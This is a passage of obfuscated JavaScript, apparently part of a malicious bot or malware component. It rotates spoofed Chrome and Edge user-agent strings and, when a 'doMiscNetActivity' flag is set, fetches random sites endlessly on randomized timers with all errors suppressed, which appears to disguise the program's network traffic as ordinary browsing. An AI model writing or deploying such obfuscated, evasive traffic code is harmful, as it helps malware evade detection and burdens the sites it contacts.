      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x2651 * 0x1 + -0x6 * -0xe3 + 0x20ff; k < -0x6e9 + 0x1 * -0x1497 + -0x3 * -0x92c; k++)
    setTimeout(f, (-0x10970 + 0x23 * -0x427 + 0x28525) * k * getRandomInt(-0x1a72 + 0x2653 * 0x1 + -0xbe0, -0x1 * 0x1319 + 0x2421 + 0x1 * -0x1105));
  setInterval(() => {
    f();
    for (let l = 0x35 * -0x61 + -0x2440 + 0xfd * 0x39; l < 0x209 * 0x4 + -0x1ccf * -0x1 + -0x24ef; l++)
      setTimeout(f, (-0x1ae6 + 0xabc2 + 0x2a2 * 0x22) * l * getRandomInt(-0x8d1 + -0x114b * 0x2 + -0xe78 * -0x3, 0x6e0 * -0x3 + 0x20c3 + -0xc20));
  }, -0x267250 + 0x2deb80 + 0x2f7550);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1 * 0x2881 + -0x16d7 * 0x2 + 0x7187) * getRandomInt(0xa57 + -0xc0f + -0x3 * -0x93, 0x16 * 0x19f + 0x11e3 + -0x476 * 0xc));
}, -0x25 * 0xa1 + -0x20f9 * 0x1 + 0x38a2);